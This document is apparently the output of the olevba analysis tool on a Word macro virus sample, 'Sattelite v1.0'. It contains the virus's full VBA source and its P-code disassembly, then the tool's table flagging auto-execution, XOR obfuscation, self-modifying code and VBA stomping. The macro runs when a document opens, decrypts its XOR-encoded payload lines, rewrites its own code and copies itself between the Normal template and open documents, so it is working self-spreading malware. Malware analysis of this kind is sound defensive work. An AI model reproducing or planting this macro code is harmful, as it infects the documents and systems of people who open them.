olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Sattelite.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Sattelite.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 









































'wEiRd GeNiUs
'Document
Private Function encr(s, k As Integer)
Dim r: r = "": For f = 1 To Len(s): r = r + Chr((Asc(Mid$(s, f, 1))) Xor k): Next: encr = r
End Function
Private Sub Document_Open()
On Error Resume Next: W = 0
WhereAmI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(43, 1)
If WhereAmI = "'NormalTemplate" Then Set Iam = NormalTemplate.VBProject.VBComponents(1).CodeModule Else: Set Iam = ActiveDocument.VBProject.VBComponents(1).CodeModule
With Iam: Z = .CountOfLines - 28: For X = 62 To Z:
If W = 20 Then W = 0
decrypt = .Lines(X, 1): W = W + 2: Y = Len(decrypt): Y = Y - 1: decrypt = Right$(decrypt, Y): .ReplaceLine X + 21, encr(decrypt, (W)): Next X: End With
Call ThisDoc: Set Iam = NormalTemplate.VBProject.VBComponents(1).CodeModule: Flag = 0: GoTo Over
Again: Set Iam = ActiveDocument.VBProject.VBComponents(1).CodeModule: Flag = 1
Over:
With Iam: For X = 83 To 102: .ReplaceLine X, "'": Next X: End With
If Flag = 0 Then GoTo Again
NormalTemplate.Save: ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument: End Sub
'----------------------------------------------------------------------
Private Sub ThisDoc()
'Ml"Gppmp"Pgqwog"Lgzv
'Etthmgepmkj*AjefhaGejgahOa}$9$s`Gejgah@mwefha`
'Ivroihu(PotsuVtirceroih&;&@gjuc
'Gx|agf{&[i~mFgzeidXzgex|(5(Nid{m
'Yo~*Ki~Ikxxcox*7*Ki~c|oNeigod~$\HZxe`oi~$\HIegzedod~y";#$IenoGenfo
'_ix,Bc~aOm~~ei~,1,Bc~am`Xia|`mxi"ZN\~cfiox"ZNOca|cbibx$=%"OchiAchy`i
'@G.3.@a|cobZkc~bozk XL^|adkmz XLMac~a`k`z}&?' MajkCaj{bk Bg`k}&:<".?'
'QY0-0QsdyfuTse}u~d>FR@bzusd>FRS}`~u~dc8!9>Stu]te|u>\y~uc8$"<0!9
'[t2GQsaw:\[;2/205EW[@V2UW\[GA02Fzw|2\}`[|afs~~wv2/2F`gw2W~aw2\}`[|afs~~wv2/2Ts~aw
']r4AWugq<Z]=4(*463CQ]FP4SQZ]AG64Uzp4AWugq<Z]=4(*4664@|qz4Ql}`4Gav
'Kd"WAcqg*CK+"?" %UGKPF"EGLKWQ "Vjgl"CavKlqvcnngf"?"Vpwg"Gnqg"CavKlqvcnngf"?"Dcnqg
'Mb$QGewa,EM-$8:$&#SAMV@$CAJMQW&$Ej`$QGewa,EM-$8:$&&$Plaj$A|mp$Wqf
'O`&HitkOhurgjjcb&;&Rtsc&Ghb&GerOhurgjjcb&;&Rtsc&Rnch&C~or&Usd
'An(FgzeAf{|iddml(5(Nid{m(\`mf2([m|(Afnmk|agf(5(FgzeKizzamz2([m|(Kizzamz(5(Ik|Kizzamz2(Md{m2([m|(Afnmk|agf(5(Ik|Kizzamz2([m|(Kizzamz(5(FgzeKizzamz
']c~b*Ikxxcox0*\cxIeno*7*$Fcdoy";&*$Ied~ElFcdoy#0*Odn*]c~b
'[exd,Ebjioxecb6,"Hi`ixi@ebi,= ,"OcybxCj@ebi6,"Ebi~x@ebi,= ,Ze~Ochi
'Gh.@a|cG`}zobbkj.3.Hob}k.Zfk`. \k~bomkBg`k.:=".,)@a|cobZkc~bozk,.Kb}k. \k~bomkBg`k.:=".,)Jam{ck`z,
'U~t0Gydx
'Asffw~{fw2d#<"
'Sattelite v1.0
'--------------------------------------------------------------
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Sattelite.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 12031 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' 	QuoteRem 0x0000 0x000C "wEiRd GeNiUs"
' Line #42:
' 	QuoteRem 0x0000 0x0008 "Document"
' Line #43:
' 	FuncDefn (Private Function encr(s, k As Integer, id_FFFE As Variant))
' Line #44:
' 	Dim 
' 	VarDefn r
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St r 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld False 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld s 
' 	FnLen 
' 	For 
' 	BoS 0x0000 
' 	Ld r 
' 	Ld s 
' 	Ld False 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Paren 
' 	Ld k 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St r 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' 	BoS 0x0000 
' 	Ld r 
' 	St encr 
' Line #45:
' 	EndFunc 
' Line #46:
' 	FuncDefn (Private Sub Document_Open())
' Line #47:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St W 
' Line #48:
' 	LitDI2 0x002B 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St WhereAmI 
' Line #49:
' 	Ld WhereAmI 
' 	LitStr 0x000F "'NormalTemplate"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Iam 
' 	Else 
' 	BoSImplicit 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Iam 
' 	EndIf 
' Line #50:
' 	StartWithExpr 
' 	Ld Iam 
' 	With 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x001C 
' 	Sub 
' 	St Z 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x003E 
' 	Ld Z 
' 	For 
' 	BoS 0x0000 
' Line #51:
' 	Ld W 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St W 
' 	EndIf 
' Line #52:
' 	Ld X 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St decrypt 
' 	BoS 0x0000 
' 	Ld W 
' 	LitDI2 0x0002 
' 	Add 
' 	St W 
' 	BoS 0x0000 
' 	Ld decrypt 
' 	FnLen 
' 	St Y 
' 	BoS 0x0000 
' 	Ld Y 
' 	LitDI2 0x0001 
' 	Sub 
' 	St Y 
' 	BoS 0x0000 
' 	Ld decrypt 
' 	Ld Y 
' 	ArgsLd Right$ 0x0002 
' 	St decrypt 
' 	BoS 0x0000 
' 	Ld X 
' 	LitDI2 0x0015 
' 	Add 
' 	Ld decrypt 
' 	Ld W 
' 	Paren 
' 	ArgsLd encr 0x0002 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	EndWith 
' Line #53:
' 	ArgsCall (Call) ThisDoc 0x0000 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Iam 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St Flag 
' 	BoS 0x0000 
' 	GoTo Over 
' Line #54:
' 	Label Again 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Iam 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St Flag 
' Line #55:
' 	Label Over 
' Line #56:
' 	StartWithExpr 
' 	Ld Iam 
' 	With 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0053 
' 	LitDI2 0x0066 
' 	For 
' 	BoS 0x0000 
' 	Ld X 
' 	LitStr 0x0001 "'"
' 	ArgsMemCallWith ReplaceLine 0x0002 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	EndWith 
' Line #57:
' 	Ld Flag 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Again 
' 	EndIf 
' Line #58:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	BoS 0x0000 
' 	EndSub 
' Line #59:
' 	QuoteRem 0x0000 0x0046 "----------------------------------------------------------------------"
' Line #60:
' 	FuncDefn (Private Sub ThisDoc())
' Line #61:
' 	QuoteRem 0x0000 0x0014 "Ml"Gppmp"Pgqwog"Lgzv"
' Line #62:
' 	QuoteRem 0x0000 0x002E "Etthmgepmkj*AjefhaGejgahOa}$9$s`Gejgah@mwefha`"
' Line #63:
' 	QuoteRem 0x0000 0x001F "Ivroihu(PotsuVtirceroih&;&@gjuc"
' Line #64:
' 	QuoteRem 0x0000 0x0020 "Gx|agf{&[i~mFgzeidXzgex|(5(Nid{m"
' Line #65:
' 	QuoteRem 0x0000 0x0044 "Yo~*Ki~Ikxxcox*7*Ki~c|oNeigod~$\HZxe`oi~$\HIegzedod~y";#$IenoGenfo"
' Line #66:
' 	QuoteRem 0x0000 0x0045 "_ix,Bc~aOm~~ei~,1,Bc~am`Xia|`mxi"ZN\~cfiox"ZNOca|cbibx$=%"OchiAchy`i"
' Line #67:
' 	QuoteRem 0x0000 0x0045 "@G.3.@a|cobZkc~bozk XL^|adkmz XLMac~a`k`z}&?' MajkCaj{bk Bg`k}&:<".?'"
' Line #68:
' 	QuoteRem 0x0000 0x0045 "QY0-0QsdyfuTse}u~d>FR@bzusd>FRS}`~u~dc8!9>Stu]te|u>\y~uc8$"<0!9"
' Line #69:
' 	QuoteRem 0x0000 0x0053 "[t2GQsaw:\[;2/205EW[@V2UW\[GA02Fzw|2\}`[|afs~~wv2/2F`gw2W~aw2\}`[|afs~~wv2/2Ts~aw"
' Line #70:
' 	QuoteRem 0x0000 0x0041 "]r4AWugq<Z]=4(*463CQ]FP4SQZ]AG64Uzp4AWugq<Z]=4(*4664@|qz4Ql}`4Gav"
' Line #71:
' 	QuoteRem 0x0000 0x0051 "Kd"WAcqg*CK+"?" %UGKPF"EGLKWQ "Vjgl"CavKlqvcnngf"?"Vpwg"Gnqg"CavKlqvcnngf"?"Dcnqg"
' Line #72:
' 	QuoteRem 0x0000 0x0041 "Mb$QGewa,EM-$8:$&#SAMV@$CAJMQW&$Ej`$QGewa,EM-$8:$&&$Plaj$A|mp$Wqf"
' Line #73:
' 	QuoteRem 0x0000 0x003D "O`&HitkOhurgjjcb&;&Rtsc&Ghb&GerOhurgjjcb&;&Rtsc&Rnch&C~or&Usd"
' Line #74:
' 	QuoteRem 0x0000 0x0091 "An(FgzeAf{|iddml(5(Nid{m(\`mf2([m|(Afnmk|agf(5(FgzeKizzamz2([m|(Kizzamz(5(Ik|Kizzamz2(Md{m2([m|(Afnmk|agf(5(Ik|Kizzamz2([m|(Kizzamz(5(FgzeKizzamz"
' Line #75:
' 	QuoteRem 0x0000 0x003A "]c~b*Ikxxcox0*\cxIeno*7*$Fcdoy";&*$Ied~ElFcdoy#0*Odn*]c~b"
' Line #76:
' 	QuoteRem 0x0000 0x0046 "[exd,Ebjioxecb6,"Hi`ixi@ebi,= ,"OcybxCj@ebi6,"Ebi~x@ebi,= ,Ze~Ochi"
' Line #77:
' 	QuoteRem 0x0000 0x0062 "Gh.@a|cG`}zobbkj.3.Hob}k.Zfk`. \k~bomkBg`k.:=".,)@a|cobZkc~bozk,.Kb}k. \k~bomkBg`k.:=".,)Jam{ck`z,"
' Line #78:
' 	QuoteRem 0x0000 0x0008 "U~t0Gydx"
' Line #79:
' 	QuoteRem 0x0000 0x000E "Asffw~{fw2d#<""
' Line #80:
' 	QuoteRem 0x0000 0x000E "Sattelite v1.0"
' Line #81:
' 	QuoteRem 0x0000 0x003E "--------------------------------------------------------------"
' Line #82:
' 	QuoteRem 0x0000 0x0000 ""
' Line #83:
' 	QuoteRem 0x0000 0x0000 ""
' Line #84:
' 	QuoteRem 0x0000 0x0000 ""
' Line #85:
' 	QuoteRem 0x0000 0x0000 ""
' Line #86:
' 	QuoteRem 0x0000 0x0000 ""
' Line #87:
' 	QuoteRem 0x0000 0x0000 ""
' Line #88:
' 	QuoteRem 0x0000 0x0000 ""
' Line #89:
' 	QuoteRem 0x0000 0x0000 ""
' Line #90:
' 	QuoteRem 0x0000 0x0000 ""
' Line #91:
' 	QuoteRem 0x0000 0x0000 ""
' Line #92:
' 	QuoteRem 0x0000 0x0000 ""
' Line #93:
' 	QuoteRem 0x0000 0x0000 ""
' Line #94:
' 	QuoteRem 0x0000 0x0000 ""
' Line #95:
' 	QuoteRem 0x0000 0x0000 ""
' Line #96:
' 	QuoteRem 0x0000 0x0000 ""
' Line #97:
' 	QuoteRem 0x0000 0x0000 ""
' Line #98:
' 	QuoteRem 0x0000 0x0000 ""
' Line #99:
' 	QuoteRem 0x0000 0x0000 ""
' Line #100:
' 	QuoteRem 0x0000 0x0000 ""
' Line #101:
' 	QuoteRem 0x0000 0x0000 ""
' Line #102:
' 	QuoteRem 0x0000 0x0000 ""
' Line #103:
' 	QuoteRem 0x0000 0x0000 ""
' Line #104:
' 	EndSub 
' Line #105:
' Line #106:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |V8%                 |Vjgl                                         |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

